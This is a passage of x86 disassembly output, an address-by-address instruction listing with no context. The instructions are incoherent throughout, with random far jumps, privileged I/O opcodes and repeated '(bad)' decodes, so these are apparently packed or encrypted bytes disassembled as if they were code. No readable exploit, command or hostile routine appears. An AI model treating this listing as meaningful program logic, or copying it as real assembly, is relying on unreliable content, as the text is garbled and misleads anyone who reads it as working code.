  41c339:	xchg   ebp,eax
  41c33a:	lock mov bh,0x4
  41c33d:	popf   
  41c33e:	arpl   WORD PTR [edx-0x44522e6a],di
  41c344:	in     eax,dx
  41c345:	fprem  
  41c347:	pop    esi
  41c348:	xor    BYTE PTR [ebx],dl
  41c34a:	shl    BYTE PTR [esi+eiz*2-0x158f9e36],1
  41c351:	mov    esp,0x4d689a64
  41c356:	dec    ebp
  41c357:	dec    esp
  41c358:	sbb    edi,ebp
  41c35a:	and    eax,0xb165fc4a
  41c35f:	xor    esi,DWORD PTR [ebx]
  41c361:	aas    
  41c362:	dec    esi
  41c363:	push   0x4e
  41c365:	rcr    DWORD PTR [ecx-0x35],cl
  41c368:	mov    ch,0xaf
  41c36a:	lahf   
  41c36b:	add    eax,0x2c0f3fe2
  41c370:	cmp    dl,0xc9
  41c373:	call   DWORD PTR [edi+eax*4-0x40b45e81]
  41c37a:	adc    ax,0x545a
  41c37e:	xor    BYTE PTR [edx-0xde94322],0xf1
  41c385:	or     DWORD PTR [esi],ebp
  41c387:	inc    ebp
  41c388:	or     ch,BYTE PTR [edx-0x7b]
  41c38b:	adc    eax,0xc530ef31
  41c390:	pop    ss
  41c391:	ins    BYTE PTR es:[edi],dx
  41c392:	ja     0x41c377
  41c394:	sub    BYTE PTR [edx],0x76
  41c397:	sub    eax,0xe2ed6356
  41c39c:	or     ch,bl
  41c39e:	adc    DWORD PTR [edi+0x3b],eax
  41c3a1:	jns    0x41c395
  41c3a3:	mov    dl,0x41
  41c3a5:	ja     0x41c424
  41c3a7:	pavgw  mm1,QWORD PTR [ebx-0x21a63dc9]
  41c3ae:	fidiv  WORD PTR [esi]
  41c3b0:	fsubr  st,st(7)
  41c3b2:	jp     0x41c3e4
  41c3b4:	xor    cl,ah
  41c3b6:	aaa    
  41c3b7:	xchg   esp,eax
  41c3b8:	(bad)  
  41c3b9:	jp     0x41c387
  41c3bb:	inc    ebp
  41c3bc:	lods   eax,DWORD PTR ds:[esi]
  41c3bd:	dec    edx
  41c3be:	mov    esi,0x7259c359
  41c3c3:	add    cl,BYTE PTR [edx+0x5f8b416c]
  41c3c9:	push   edx
  41c3ca:	bound  eax,QWORD PTR [ebp-0xa]
  41c3cd:	push   0x958c98af
  41c3d2:	xchg   ebp,eax
  41c3d3:	mov    al,0x9d
  41c3d5:	xor    eax,0x7a2142a4
  41c3da:	xchg   ebx,eax
  41c3db:	push   ebp
  41c3dc:	sar    edi,1
  41c3de:	mov    bl,0xc4
  41c3e0:	test   eax,0x8205f43c
  41c3e5:	cmp    DWORD PTR [edx-0x41],esp
  41c3e8:	in     eax,0x0
  41c3ea:	inc    ebp
  41c3eb:	lea    ecx,[ebx+0x5e7646c5]
  41c3f1:	mov    eax,ds:0xae2b964c
  41c3f6:	das    
  41c3f7:	cld    
  41c3f8:	ins    BYTE PTR es:[edi],dx
  41c3f9:	lods   eax,DWORD PTR ds:[esi]
  41c3fa:	and    al,0x14
  41c3fc:	mov    dl,0x68
  41c3fe:	xchg   ebp,eax
  41c3ff:	mov    edx,0xd0b72456
  41c404:	mov    esi,0x19308e12
  41c409:	adc    edx,DWORD PTR [eax+esi*1]
  41c40c:	cmp    edi,DWORD PTR [ebx-0x5363ec5f]
  41c412:	mov    ah,0x21
  41c414:	retf   0x9c62
  41c417:	jmp    0xd8c4:0x7a93f366
  41c41e:	push   ebx
  41c41f:	pop    ebp
  41c420:	out    dx,al
  41c421:	or     BYTE PTR [ebp+ecx*2-0x7f],al
  41c425:	add    al,0x2e
  41c427:	test   DWORD PTR [edi+0xb],eax
  41c42a:	retf   0x267f
  41c42d:	sbb    DWORD PTR [esi-0x16],ecx
  41c430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c431:	aad    0x80
  41c433:	adc    edi,DWORD PTR [edx+0x24a04f3d]
  41c439:	xchg   esi,eax
  41c43a:	(bad)
  41c43e:	jo     0x41c3fb
  41c440:	iret   
  41c441:	aaa    
  41c442:	push   ecx
  41c443:	mov    bl,0x52
  41c445:	loopne 0x41c477
  41c447:	and    dh,0x3a
  41c44a:	js     0x41c493
  41c44c:	int    0x5c
  41c44e:	add    ah,BYTE PTR [edi+0x74]
  41c451:	xchg   edx,eax
  41c452:	ds xor cl,ch
  41c455:	cmp    eax,0xd0189737
  41c45a:	out    0x50,al
  41c45c:	jno    0x41c488
  41c45e:	adc    bl,BYTE PTR [ecx+0x19]
  41c461:	jo     0x41c437
  41c463:	dec    ebx
  41c464:	(bad)  
  41c465:	test   eax,0xbcd7a44
  41c46a:	sahf   
  41c46b:	push   ss
  41c46c:	add    eax,0xfb07fe0f
  41c471:	xchg   esp,eax
  41c472:	ret    0x5ac8
  41c475:	mov    ds:0x8dfa7db8,eax
  41c47a:	xchg   edx,eax
  41c47b:	shl    esi,cl
  41c47d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c47e:	in     eax,0x5a
  41c480:	pop    ebp
  41c481:	or     eax,0x635225a
  41c486:	lods   eax,DWORD PTR ds:[esi]
  41c487:	ret    0x41fd
  41c48a:	dec    ebp
  41c48b:	pop    ss
  41c48c:	sbb    BYTE PTR [ebx+0x5a5d835f],0x8d
  41c493:	mov    eax,0xa201385e
  41c498:	std    
  41c499:	lea    edx,[esi-0x3d45eae3]
  41c49f:	jmp    0x5dd1:0xb97244ef
  41c4a6:	pop    edx
  41c4a7:	into   
  41c4a8:	std    
  41c4a9:	xchg   dh,dl
  41c4ab:	mov    ch,BYTE PTR [eax+esi*8+0x3a]
  41c4af:	pop    esi
  41c4b0:	retf   
  41c4b1:	jmp    DWORD PTR [ecx+0xf]
  41c4b4:	xor    ebp,DWORD PTR [ebx+eax*4-0x7ae00660]
  41c4bb:	repz shl BYTE PTR [eax-0x77],0x25
  41c4c0:	or     BYTE PTR [ebp-0x3d],bh
  41c4c3:	xor    ch,BYTE PTR [ecx]
  41c4c5:	icebp  
  41c4c6:	ds jl  0x41c544
  41c4c9:	fnstcw WORD PTR [ebx]
  41c4cb:	fldenv [esi-0x2a]
  41c4ce:	pop    ds
  41c4cf:	int3   
  41c4d0:	or     al,0x6e
  41c4d2:	xchg   edx,eax
  41c4d3:	jmp    0x7817:0x7cd66234
  41c4da:	test   ah,dl
  41c4dc:	push   ds
  41c4dd:	mov    eax,ds:0x93790cb
  41c4e2:	mov    ds:0xe135b016,eax
  41c4e7:	outs   dx,DWORD PTR ds:[esi]
  41c4e8:	mov    al,0x5e
  41c4ea:	fisttp DWORD PTR [ebp+0x5f98a15c]
  41c4f0:	outs   dx,DWORD PTR ds:[esi]
  41c4f1:	fwait
  41c4f2:	inc    edx
  41c4f3:	cmp    BYTE PTR [ecx+0x1aa3293f],dh
  41c4f9:	inc    ecx
  41c4fa:	in     al,dx
  41c4fb:	pop    ds
  41c4fc:	(bad)  
  41c4fd:	pop    edi
  41c4fe:	mov    esi,0xc74b4364
  41c503:	outs   dx,BYTE PTR ds:[esi]
  41c504:	test   BYTE PTR [eax-0x7a],dl
  41c507:	jno    0x41c4d0
  41c509:	pop    esi
  41c50a:	dec    ebp
  41c50b:	ins    DWORD PTR es:[edi],dx
  41c50c:	jb     0x41c491
  41c50e:	leave  
  41c50f:	(bad)  
  41c510:	shl    esp,0x98
  41c513:	cdq    
  41c514:	neg    DWORD PTR [ebp+0x69]
  41c517:	jo     0x41c57a
  41c519:	enter  0x6a04,0xc
  41c51d:	xchg   esi,eax
  41c51e:	jl     0x41c4be
  41c520:	and    DWORD PTR [ebx],0xffffff99
  41c523:	jnp    0x41c598
  41c525:	leave  
  41c526:	xchg   edi,eax
  41c527:	pop    esi
  41c528:	and    eax,0x28f02af8
  41c52d:	fnstsw WORD PTR [edi+0x6a]
  41c530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c531:	sbb    cl,BYTE PTR [edx-0x2a2a0e5a]
  41c537:	cmp    dh,BYTE PTR [ecx+esi*8]
  41c53a:	push   cs
  41c53b:	mov    ah,0x3b
  41c53d:	stc    
  41c53e:	rcl    DWORD PTR [edx+esi*4-0x7d],1
  41c542:	dec    eax
  41c543:	push   ebx
  41c544:	imul   ebp,esi,0x7e7dc32e
  41c54a:	xchg   esi,eax
  41c54b:	jnp    0x41c521
  41c54d:	lods   eax,DWORD PTR ds:[esi]
  41c54e:	adc    dl,BYTE PTR [edx-0x408a7eb7]
  41c554:	sbb    ch,al
  41c556:	or     DWORD PTR [esi+0x79],ecx
  41c559:	sbb    DWORD PTR [ecx+ebp*2+0x39],ecx
  41c55d:	pop    esi
  41c55e:	dec    esp
  41c55f:	outs   dx,DWORD PTR ds:[esi]
  41c560:	mov    DWORD PTR [esp+ebx*2-0x1d0f21c1],ebx
  41c567:	cmp    ah,0x38
  41c56a:	push   eax
  41c56b:	pusha  
  41c56c:	and    eax,0x9d0e21b2
  41c571:	leave  
  41c572:	loope  0x41c50f
  41c574:	cli    
  41c575:	dec    edx
  41c576:	mov    DWORD PTR [ebx-0x138e7d5e],esp
  41c57c:	retf   
  41c57d:	repnz xor eax,0xf4b5c6f6
  41c583:	cld    
  41c584:	lds    edx,FWORD PTR [ecx+0x2f]
  41c587:	add    DWORD PTR [ebx+0x6c],0xb
  41c58b:	(bad)  
  41c58c:	ss lahf 
  41c58e:	fisub  DWORD PTR ds:0x3408bbea
  41c594:	hlt    
  41c595:	jl     0x41c5e5
  41c597:	mov    eax,ds:0x688bdb01
  41c59c:	xchg   esi,eax
  41c59d:	sub    bl,BYTE PTR [edx-0x52c0a839]
  41c5a3:	cmp    al,0xf6
  41c5a5:	mov    al,0xdd
  41c5a7:	repnz rcr BYTE PTR [ebx+edi*4],cl
  41c5ab:	hlt    
  41c5ac:	and    DWORD PTR ds:0x4e60a6a5,esi
  41c5b2:	hlt    
  41c5b3:	popf   
  41c5b4:	stos   DWORD PTR es:[edi],eax
  41c5b5:	cld    
  41c5b6:	idiv   BYTE PTR [eax+ebx*1]
  41c5b9:	xor    BYTE PTR [esi+eiz*8-0x743fea1c],0xd2
  41c5c1:	sub    ah,dh
  41c5c3:	iret   
  41c5c4:	pop    eax
  41c5c5:	pop    esi
  41c5c6:	dec    ebp
  41c5c7:	mov    ah,0x3e
  41c5c9:	sub    esp,DWORD PTR [ebx+0x46937c3]
  41c5cf:	mov    eax,ds:0xa3963ac3
  41c5d4:	jae    0x41c5dc
  41c5d6:	xor    ah,ah
  41c5d8:	mov    dl,0x23
  41c5da:	inc    ebx
  41c5db:	push   0xf07efd2d
  41c5e0:	push   ebp
  41c5e1:	dec    ecx
  41c5e2:	mov    ah,0xc1
  41c5e4:	sub    DWORD PTR [edx-0x2e],ebx
  41c5e7:	addr16 xchg ebp,eax
  41c5e9:	cmp    bl,al
  41c5eb:	inc    ebp
  41c5ec:	cld    
  41c5ed:	fnsave [ebx]
  41c5ef:	jno    0x41c612
  41c5f1:	sub    al,0xfe
  41c5f3:	fdivr  QWORD PTR [esi-0x39]
  41c5f6:	ficom  DWORD PTR [esi+eax*2+0x2163d880]
  41c5fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5fe:	stos   BYTE PTR es:[edi],al
  41c5ff:	(bad)  
  41c600:	out    0x61,eax
  41c602:	int    0x24
  41c604:	sbb    edx,DWORD PTR [edi]
  41c606:	sbb    al,0xef
  41c608:	jb     0x41c671
  41c60a:	jmp    0x6752a0e7
  41c60f:	into   
  41c610:	fst    DWORD PTR [edi]
  41c612:	stos   DWORD PTR es:[edi],eax
  41c613:	lds    edi,FWORD PTR [eax]
  41c615:	dec    ebp
  41c616:	js     0x41c635
  41c618:	aam    0x2
  41c61a:	add    eax,edi
  41c61c:	or     bh,al
  41c61e:	cwde   
  41c61f:	xchg   ebp,eax
  41c620:	and    DWORD PTR [ecx+ebp*4],esp
  41c623:	in     eax,dx
  41c624:	es retf 0x9ebb
  41c628:	gs mov ebx,0x519af11d
  41c62e:	fwait
  41c62f:	mov    bh,0x71
  41c631:	iret   
  41c632:	stos   DWORD PTR es:[edi],eax
  41c633:	aas    
  41c634:	pop    ds
  41c635:	pop    edi
  41c636:	sbb    BYTE PTR [eax-0x2043c935],bh
  41c63c:	nop
  41c63d:	shr    BYTE PTR [edx+0x7c],0xe2
  41c641:	add    al,0x5c
  41c643:	adc    ch,BYTE PTR [eax+0x15f03d09]
  41c649:	and    eax,0x44c71850
  41c64e:	jecxz  0x41c666
  41c650:	push   ebp
  41c651:	or     BYTE PTR [esi],ch
  41c653:	test   cl,dh
  41c655:	ins    DWORD PTR es:[edi],dx
  41c656:	sub    eax,0x121e51e5
  41c65b:	out    0xc6,al
  41c65d:	sub    eax,ecx
  41c65f:	dec    esi
  41c660:	aas    
  41c661:	out    dx,eax
  41c662:	xlat   BYTE PTR ds:[ebx]
  41c663:	test   DWORD PTR [edx+0x3d],edi
  41c666:	js     0x41c65b
  41c668:	(bad)  
  41c669:	pushf  
  41c66a:	not    BYTE PTR [ebx]
  41c66c:	cdq    
  41c66d:	(bad)  [ebx-0x5325f79]
  41c673:	sbb    BYTE PTR [eax],al
  41c675:	in     eax,0x7d
  41c677:	add    eax,0x62921d89
  41c67c:	sbb    al,0x69
  41c67e:	loop   0x41c69c
  41c680:	stos   BYTE PTR es:[edi],al
  41c681:	xchg   esi,eax
  41c682:	mov    edx,0x78acfb6d
  41c687:	test   BYTE PTR [ebx+0x329a81f2],0x52
  41c68e:	sub    BYTE PTR [ebp+0x7c],bl
  41c691:	xchg   ecx,eax
  41c692:	xchg   ecx,eax
  41c693:	add    al,0x7d
  41c695:	(bad)  [edi-0x44]
  41c698:	xchg   esi,eax
  41c699:	ss mov ebx,0xee9a38d7
  41c69f:	mov    esi,0x13fae3c4
  41c6a4:	add    bl,BYTE PTR [eax+0x6d9321d1]
  41c6aa:	ins    DWORD PTR es:[edi],dx
  41c6ab:	(bad)  
  41c6ac:	shl    DWORD PTR [edx+0x7c],0xa1
  41c6b0:	mov    dh,0xed
  41c6b2:	pop    ecx
  41c6b3:	adc    eax,DWORD PTR [eax]
  41c6b5:	pop    edx
  41c6b6:	callw  0xeb44
  41c6ba:	pop    edx
  41c6bb:	in     al,dx
  41c6bc:	cwde   
  41c6bd:	dec    edi
  41c6be:	sbb    BYTE PTR [edx+0x1b],cl
  41c6c1:	push   eax
  41c6c2:	pop    ebx
  41c6c3:	out    dx,al
  41c6c4:	inc    edx
  41c6c5:	or     BYTE PTR [ebp+eax*4+0x48],bh
  41c6c9:	std    
  41c6ca:	jb     0x41c684
  41c6cc:	(bad)  
  41c6cd:	jae    0x41c6d5
  41c6cf:	mov    dh,0x7e
  41c6d1:	ins    BYTE PTR es:[edi],dx
  41c6d2:	imul   edx,DWORD PTR [esi-0x3d61a7e0],0x69d2f61a
  41c6dc:	push   esp
  41c6dd:	repz pop ds
  41c6df:	mov    bh,BYTE PTR [esi]
  41c6e1:	cmp    DWORD PTR [edx+0x49c4bd49],esp
  41c6e7:	ds mov bl,0xa2
  41c6ea:	into   
  41c6eb:	cmp    ebx,ebp
  41c6ed:	imul   ebp,DWORD PTR [ebx],0x28
  41c6f0:	dec    ecx
  41c6f1:	or     bl,BYTE PTR [eax]
  41c6f3:	xchg   ecx,eax
  41c6f4:	push   ecx
  41c6f5:	inc    ecx
  41c6f6:	in     eax,0xec
  41c6f8:	sbb    al,BYTE PTR [edx]
  41c6fa:	mov    bl,0x95
  41c6fc:	push   ebx
  41c6fd:	and    BYTE PTR [esi+0x40],ch
  41c700:	scas   al,BYTE PTR es:[edi]
  41c701:	and    eax,0xede6b282
  41c706:	rcl    BYTE PTR [ebp+edx*8+0x4f22ead7],1
  41c70d:	jae    0x41c75b
  41c70f:	mov    bl,0xa2
  41c711:	test   edx,edi
  41c713:	xchg   ebp,edx
  41c715:	rol    BYTE PTR [esi-0x26b0abcb],1
  41c71b:	dec    ecx
  41c71c:	mov    eax,ds:0x1f18c838
  41c721:	cmp    bl,ah
  41c723:	jmp    0x41c712
  41c725:	push   eax
  41c726:	arpl   WORD PTR [ebx+eiz*8+0x9d4e6ad],cx
  41c72d:	lods   eax,DWORD PTR ds:[esi]
  41c72e:	fnstenv [esi+eax*4]
  41c731:	sub    esp,DWORD PTR [esi-0x366591bb]
  41c737:	test   al,0x5e
  41c739:	xchg   esp,eax
  41c73a:	jnp    0x41c72d
  41c73c:	dec    ebp
  41c73d:	mov    dl,0x51
  41c73f:	xlat   BYTE PTR ds:[ebx]
  41c740:	sub    ebp,eax
  41c742:	dec    edx
  41c743:	push   esp
  41c744:	dec    esp
  41c745:	sub    BYTE PTR [edx+0x33473c22],bh
  41c74b:	jle    0x41c756
  41c74d:	mov    ah,BYTE PTR [eax+0x23738fbd]
  41c753:	daa    
  41c754:	pop    ds
  41c755:	fdiv   DWORD PTR [ebx]
  41c757:	loop   0x41c713
  41c759:	sbb    ebx,DWORD PTR [edi]
  41c75b:	mov    esi,ds
  41c75d:	dec    esp
  41c75e:	jnp    0x41c784
  41c760:	cmova  ebp,DWORD PTR [ebx]
  41c763:	mov    edx,edx
  41c765:	fbstp  TBYTE PTR [edx-0x6e]
  41c768:	xchg   esi,eax
  41c769:	mov    bh,0x9e
  41c76b:	outs   dx,BYTE PTR ds:[esi]
  41c76c:	or     BYTE PTR [esi+0xce4c62f],0x65
  41c773:	cmp    eax,0x1ea7a957
  41c778:	outs   dx,DWORD PTR ds:[esi]
  41c779:	push   esp
  41c77a:	daa    
  41c77b:	out    dx,eax
  41c77c:	lods   al,BYTE PTR ds:[esi]
  41c77d:	mov    ah,BYTE PTR [edi]
  41c77f:	or     esi,DWORD PTR [eax]
  41c781:	arpl   WORD PTR [edi-0x14860578],bp
  41c787:	inc    esp
  41c788:	fist   WORD PTR [ebx+0x50]
  41c78b:	dec    esp
  41c78c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c78d:	cs push ecx
  41c78f:	loope  0x41c779
  41c791:	sub    al,0x9f
  41c793:	xchg   ebp,eax
  41c794:	je     0x41c7ab
  41c796:	lods   al,BYTE PTR ds:[esi]
  41c797:	mov    esp,0x46714439
  41c79c:	mov    esi,0xf36bd5d1
  41c7a1:	ja     0x41c7de
  41c7a3:	out    dx,al
  41c7a4:	xor    bl,BYTE PTR [eax-0x60]
  41c7a7:	cmp    eax,0xc6616ea8
  41c7ac:	fmul   st,st(3)
  41c7ae:	mov    ds:0x10752c29,al
  41c7b3:	addr16 pop ebp
  41c7b5:	xor    BYTE PTR [ebx+ebp*8],ch
  41c7b8:	push   0x61
  41c7ba:	fimul  DWORD PTR [ebx-0x29]
  41c7bd:	xor    eax,0x7c8f2580
  41c7c2:	gs cmp ecx,esi
  41c7c5:	mov    bl,0x55
  41c7c7:	rcl    bh,cl
  41c7c9:	sub    dh,0x6
  41c7cc:	stc    
  41c7cd:	push   ss
  41c7ce:	xchg   bl,dh
  41c7d0:	push   esi
  41c7d1:	xchg   edi,eax
  41c7d2:	xlat   BYTE PTR ds:[ebx]
  41c7d3:	pop    esi
  41c7d4:	jmp    0x41c828
  41c7d6:	imul   eax,DWORD PTR [eax],0x5f
  41c7d9:	icebp  
  41c7da:	xchg   edx,eax
  41c7db:	(bad)  
  41c7dc:	loope  0x41c778
  41c7de:	mov    esi,0xbb27a60
  41c7e3:	sub    BYTE PTR ds:0x19d020b3,0x6a
  41c7ea:	sub    bl,ch
  41c7ec:	push   ecx
  41c7ed:	call   0x78ed:0x5cf631b9
  41c7f4:	jl     0x41c815
  41c7f6:	pop    edx
  41c7f7:	into   
  41c7f8:	or     al,0xf3
  41c7fa:	icebp  
  41c7fb:	fst    QWORD PTR [eax-0x1dd2d4e6]
  41c801:	xor    DWORD PTR [eax+0x1e7ac900],0x1d64df5c
  41c80b:	jb     0x41c7c4
  41c80d:	mov    ecx,0x76106702
  41c812:	push   edx
  41c813:	add    eax,0x39351c70
  41c818:	xor    ebx,DWORD PTR [ebp+0x79]
  41c81b:	mov    eax,0xb130f292
  41c820:	das    
  41c821:	cmp    eax,0x6f230048
  41c826:	mov    cl,BYTE PTR ds:0xfd6bbbe1
  41c82c:	fistp  WORD PTR [edx-0x4dfcb77d]
  41c832:	mov    al,0x60
  41c834:	stos   BYTE PTR es:[edi],al
  41c835:	sub    ecx,DWORD PTR [ecx+0x2ba249d]
  41c83b:	aam    0x77
  41c83d:	jne    0x41c820
  41c83f:	fistp  QWORD PTR [edx+ebx*2+0xc]
  41c843:	mov    al,0x4c
  41c845:	or     BYTE PTR [ebx-0x64],al
  41c848:	lods   eax,DWORD PTR ds:[esi]
  41c849:	mov    BYTE PTR [ecx-0x3004a80a],bl
  41c84f:	ja     0x41c88c
  41c851:	iret   
  41c852:	imul   ebx,esp,0x1a
  41c855:	inc    ecx
  41c856:	inc    ebp
  41c857:	sahf   
  41c858:	push   eax
  41c859:	mov    ds:0x7ee1da9f,al
  41c85e:	sub    DWORD PTR ds:0xb204a047,edi
  41c864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c865:	outs   dx,DWORD PTR ds:[esi]
  41c866:	jecxz  0x41c871
  41c868:	add    BYTE PTR [ebx+0x4595d2c6],dh
  41c86e:	cmp    bh,BYTE PTR [edx+esi*4]
  41c871:	outs   dx,DWORD PTR ds:[esi]
  41c872:	inc    esp
  41c873:	add    DWORD PTR [edi+0x3e],0x3deaf872
  41c87a:	push   cs
  41c87b:	xor    ebp,DWORD PTR ds:0xf3742b90
  41c881:	ins    BYTE PTR es:[edi],dx
  41c882:	push   edi
  41c883:	test   DWORD PTR [edi-0x24f06793],ebx
  41c889:	gs sub eax,0xdbf18945
  41c88f:	aas    
  41c890:	(bad)  
  41c891:	imul   edi,DWORD PTR [esi+eax*4-0x44fc9ce3],0x7
  41c899:	mov    dl,0x5a
  41c89b:	fisttp WORD PTR [edx-0x65768d97]
  41c8a1:	leave  
  41c8a2:	cmp    edx,DWORD PTR [edi+eiz*1-0x6d3e5994]
  41c8a9:	mov    al,0x9a
  41c8ab:	fisttp WORD PTR [ebx+0x6fd30936]
  41c8b1:	pop    eax
  41c8b2:	cld    
  41c8b3:	jmp    0xbab5:0xbaf8af04
  41c8ba:	repz lea ecx,[eax+0x1c]
  41c8be:	mov    ebx,0xa23abaea
  41c8c3:	mov    edx,0xb2d7aaa1
  41c8c8:	rcl    BYTE PTR [eax],cl
  41c8ca:	test   esp,eax
  41c8cc:	(bad)  
  41c8ce:	or     BYTE PTR [ebp+0x3],dl
  41c8d1:	(bad)  
  41c8d2:	das    
  41c8d3:	jge    0x41c8f7
  41c8d5:	add    ch,BYTE PTR [ecx+0x25]
  41c8d8:	test   BYTE PTR [edx],dl
  41c8da:	mov    eax,0xd54e87cc
  41c8df:	mov    dh,BYTE PTR [edi]
  41c8e1:	inc    esi
  41c8e2:	sub    eax,0x5ad69d29
  41c8e7:	mov    bl,BYTE PTR [edi+0x7e831a06]
  41c8ed:	fisubr WORD PTR [esi+0xe]
  41c8f0:	mov    bl,0x79
  41c8f2:	jmp    0xabe8:0xd33dcb57
  41c8f9:	and    al,0x43
  41c8fb:	aaa    
  41c8fc:	in     eax,dx
  41c8fd:	retf   0x9d54
  41c900:	xchg   ebx,eax
  41c901:	inc    ebp
  41c902:	imul   esp,DWORD PTR [esi+ecx*8+0x14],0x2708076f
  41c90a:	adc    DWORD PTR [ecx-0x10],0xffffffe9
  41c90e:	addr16 (bad) 
  41c910:	dec    ebp
  41c911:	or     ecx,eax
  41c913:	stc    
  41c914:	(bad)  
  41c916:	push   esi
  41c917:	sub    al,0xac
  41c919:	jne    0x41c974
  41c91b:	sti    
  41c91c:	inc    edx
  41c91d:	mov    ch,0x7f
  41c91f:	or     DWORD PTR [edi],esp
  41c921:	cmp    ebx,DWORD PTR [eax]
  41c923:	xlat   BYTE PTR ds:[ebx]
  41c924:	sti    
  41c925:	scas   al,BYTE PTR es:[edi]
  41c926:	push   eax
  41c927:	out    0xf5,eax
  41c929:	js     0x41c8bf
  41c92b:	loop   0x41c942
  41c92d:	pop    ecx
  41c92e:	fs adc eax,0xb03e6295
  41c934:	fnstsw WORD PTR ds:0x94fcdb89
  41c93a:	cmp    ah,BYTE PTR [ebx]
  41c93c:	fbstp  TBYTE PTR [edx]
  41c93e:	outs   dx,BYTE PTR ds:[esi]
  41c93f:	dec    ecx
  41c940:	jecxz  0x41c98d
  41c942:	shl    DWORD PTR [ebx],0x2d
  41c945:	jnp    0x41c924
  41c947:	add    BYTE PTR [esi-0x7b59f896],bl
  41c94d:	pop    eax
  41c94e:	ss and al,0xde
  41c951:	int    0x1a
  41c953:	test   DWORD PTR [esi-0x2fec108f],esi
  41c959:	retf   
  41c95a:	mov    ah,0xbf
  41c95c:	loope  0x41c97b
  41c95e:	push   ebx
  41c95f:	dec    edi
  41c960:	jge    0x41c976
  41c962:	inc    esi
  41c963:	and    esi,DWORD PTR [ebx+0xe22e2c8]
  41c969:	adc    ebp,DWORD PTR [esi+edx*2]
  41c96c:	push   es
  41c96d:	adc    eax,0xc7fd3142
  41c972:	retf   0xd886
  41c975:	fidiv  DWORD PTR [eax+0x68]
  41c978:	mov    al,0x68
  41c97a:	aaa    
  41c97b:	std    
  41c97c:	dec    edi
  41c97d:	test   DWORD PTR [edi],ecx
  41c97f:	inc    ebp
  41c980:	repnz xchg ecx,eax
  41c982:	gs dec esi
  41c984:	mov    eax,ds:0xb3d7db28
  41c989:	xchg   ebx,eax
  41c98a:	push   ds
  41c98b:	mov    ch,0xb9
  41c98d:	imul   BYTE PTR [ebp-0x47d7928c]
  41c993:	(bad)  
  41c994:	pop    esp
  41c995:	xchg   ebx,eax
  41c996:	pop    edx
  41c997:	stc    
  41c998:	ja     0x41c974
  41c99a:	or     eax,0x6f1d4ccf
  41c99f:	push   edi
  41c9a0:	pop    esi
  41c9a1:	xchg   esi,eax
  41c9a2:	jne    0x41c9ab
  41c9a4:	in     al,dx
  41c9a5:	pop    ebx
  41c9a6:	or     DWORD PTR [ecx],ecx
  41c9a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9a9:	pop    ecx
  41c9aa:	clc    
  41c9ab:	mov    edi,0x5d2d6fc
  41c9b0:	mov    bl,0x18
  41c9b2:	inc    ecx
  41c9b3:	cli    
  41c9b4:	sti    
  41c9b5:	(bad)
  41c9b8:	xor    esp,edi
  41c9ba:	xchg   ecx,eax
  41c9bb:	adc    eax,eax
  41c9bd:	xchg   ebx,eax
  41c9be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9bf:	daa    
  41c9c0:	cs out 0xe9,al
  41c9c3:	xlat   BYTE PTR ds:[ebx]
  41c9c4:	(bad)  
  41c9c5:	or     eax,0xec6380af
  41c9ca:	cmc    
  41c9cb:	jae    0x41ca4b
  41c9cd:	cmp    ecx,DWORD PTR [edi]
  41c9cf:	adc    esi,0x41
  41c9d2:	add    ecx,eax
  41c9d4:	mov    WORD PTR [ecx+edi*8],ss
  41c9d7:	scas   eax,DWORD PTR es:[edi]
  41c9d8:	data16 mov ah,0x30
  41c9db:	stc    
  41c9dc:	sub    eax,0xecd47437
  41c9e1:	iret   
  41c9e2:	aad    0xc3
  41c9e4:	cmp    eax,0x9c894ffb
  41c9e9:	jmp    0x41ca50
  41c9eb:	cmp    DWORD PTR [eax+0x7d1912b3],ecx
  41c9f1:	xchg   ecx,eax
  41c9f2:	dec    eax
  41c9f3:	mov    BYTE PTR [ecx-0x32fd4b6f],bl
  41c9f9:	sub    eax,0x26d8e64b
  41c9fe:	js     0x41c991
  41ca00:	mov    al,ds:0xc633e32c
  41ca05:	fidivr WORD PTR [edi-0x5ddf931]
  41ca0b:	cmp    DWORD PTR [esi-0x43e2df9d],edx
  41ca11:	retf   
  41ca12:	je     0x41ca5d
  41ca14:	inc    esi
  41ca15:	mov    ecx,ds
  41ca17:	cmp    al,0xcc
  41ca19:	(bad)  
  41ca1b:	rcl    DWORD PTR [ecx+0x2d],1
  41ca1e:	sahf   
  41ca1f:	sti    
  41ca20:	add    edi,edx
  41ca22:	adc    bh,0xa4
  41ca25:	push   0xffffff83
  41ca27:	or     ebx,DWORD PTR [ecx]
  41ca29:	dec    esi
  41ca2a:	popf   
  41ca2b:	ds call 0x4d2a:0x42748c54
  41ca33:	and    DWORD PTR [ebp-0x3518313d],edi
  41ca39:	ja     0x41ca50
  41ca3b:	or     BYTE PTR [ebp-0x3e],dl
  41ca3e:	push   edx
  41ca3f:	ret    0xbe6c
  41ca42:	sbb    eax,0x531cdf1
  41ca47:	mov    eax,0x73307386
  41ca4c:	stos   DWORD PTR es:[edi],eax
  41ca4d:	mov    esi,0x213b6d5b
  41ca52:	test   eax,0xdc0a8898
  41ca57:	arpl   WORD PTR [ecx+0x10037846],bp
  41ca5d:	inc    eax
  41ca5e:	push   ss
  41ca5f:	popa   
  41ca60:	mov    al,ds:0x4ac4980
  41ca65:	push   eax
  41ca66:	leave  
  41ca67:	in     eax,dx
  41ca68:	or     ah,bl
  41ca6a:	sbb    BYTE PTR [ecx+ebx*1+0x25792311],ah
  41ca71:	add    al,0xd5
  41ca73:	cmp    bl,BYTE PTR [edx-0x6f]
  41ca76:	adc    DWORD PTR [eax+0x6c],edx
  41ca79:	std    
  41ca7a:	mov    eax,0xb823756d
  41ca7f:	cli    
  41ca80:	fnstcw WORD PTR [eax]
  41ca82:	rcl    BYTE PTR [eax-0x71],1
  41ca85:	sub    ebp,DWORD PTR [esi-0x69a431d3]
  41ca8b:	inc    eax
  41ca8c:	sub    BYTE PTR [esp+edi*8],ah
  41ca8f:	sahf   
  41ca90:	and    DWORD PTR [ebx],ebx
  41ca92:	imul   eax,DWORD PTR [esi+eiz*1+0x3f5bb3e3],0x7c
  41ca9a:	jno    0x41caa1
  41ca9c:	int3   
  41ca9d:	mov    esi,0x56bf3e78
